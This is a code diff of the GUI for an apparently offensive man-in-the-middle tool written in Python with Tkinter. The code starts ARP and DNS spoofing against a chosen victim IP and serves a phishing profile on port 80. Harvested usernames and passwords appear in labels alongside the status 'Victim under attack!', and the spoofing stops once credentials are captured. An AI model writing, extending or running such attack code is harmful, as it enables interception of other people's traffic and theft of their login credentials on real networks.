@@ -187,13 +187,10 @@ class MITMerFrame(Frame):
 
             reset_proc = Process(target=spoofer.restore)
             flush_proc = Process(target=spoofer.flush)
-            stop_proc = Process(target=server.stop)
 
             try:
                 dnsspoof_proc.terminate()
                 server_proc.terminate()
-                stop_proc.start()
-                stop_proc.join()
             except:
                 pass
 
@@ -209,13 +206,31 @@ class MITMerFrame(Frame):
             self.start_button.config(state="enabled")
             self.status.set_status("Attack stopped. Ready.")
 
+        def update():
+
+            if self.parent_conn.poll():
+                recieved = self.parent_conn.recv()
+
+                if recieved[0] == "url":
+                    self.urls_list.insert(END, recieved[1])
+                    self.urls_list.yview(END)
+
+                elif recieved[0] == "cred":
+                    self.site_label.config(text="Service:\t   %s" % recieved[1])
+                    self.user_label.config(text="Username:   %s" % recieved[2])
+                    self.pass_label.config(text="Password:\t   %s" % recieved[3])
+                    dnsspoof_proc.terminate()
+                    server_proc.terminate()
+
+            self.after(200, update)
+
         self.status.set_status("Initializing attack...")
 
         self.start_button.config(state="disabled")
         interface = get_if_list()[self.inter_list.current() - 1]
 
         spoofer = Spoofer(interface, self.vic_ip_var.get(), get_gateway(interface))
-        server = WebServer(self.profile_list.get().lower(), self.child_conn)
+        server = WebServer(self.profile_list.get().lower(), 80, self.child_conn)
 
         if self.modes_list.current() == 0:
             spoofer.forward(enable=True)
@@ -253,18 +268,4 @@ class MITMerFrame(Frame):
         inspect_proc.start()
 
         self.status.set_status("Victim under attack!")
-        self.update()
-
-    def update(self):
-
-        if self.parent_conn.poll():
-            recieved = self.parent_conn.recv()
-            if recieved[0] == "url":
-                self.urls_list.insert(END, recieved[1])
-                self.urls_list.yview(END)
-            elif recieved[0] == "cred":
-                if recieved[1] != "None":
-                    self.site_label.config(text="Service:\t   %s" % recieved[1])
-                    self.user_label.config(text="Username:   %s" % recieved[2])
-                    self.pass_label.config(text="Password:\t   %s" % recieved[3])
-        self.after(200, self.update)
+        update()
